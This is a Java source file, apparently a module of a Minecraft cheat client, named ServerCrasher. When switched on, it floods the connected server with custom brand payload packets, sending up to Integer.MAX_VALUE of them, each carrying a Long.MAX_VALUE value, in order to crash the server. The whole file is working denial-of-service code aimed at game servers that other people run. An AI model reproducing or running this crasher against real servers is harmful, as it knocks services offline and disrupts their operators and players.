package paul.fallen.module.modules.player;

import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CCustomPayloadPacket;
import paul.fallen.module.Module;

public class ServerCrasher extends Module {

    public ServerCrasher(int bind, String name, String displayName, Category category, String description) {
        super(bind, name, displayName, category, description);
    }

    @Override
    public void onEnable() {
        super.onEnable();

        final PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
        packetbuffer.writeLong(Long.MAX_VALUE);

        for (int i = 0; i < Integer.MAX_VALUE; i++) {
            mc.player.connection.sendPacket(new CCustomPayloadPacket(CCustomPayloadPacket.BRAND, packetbuffer));
        }

        setState(false);
        onDisable();
        super.onDisable();
    }
}
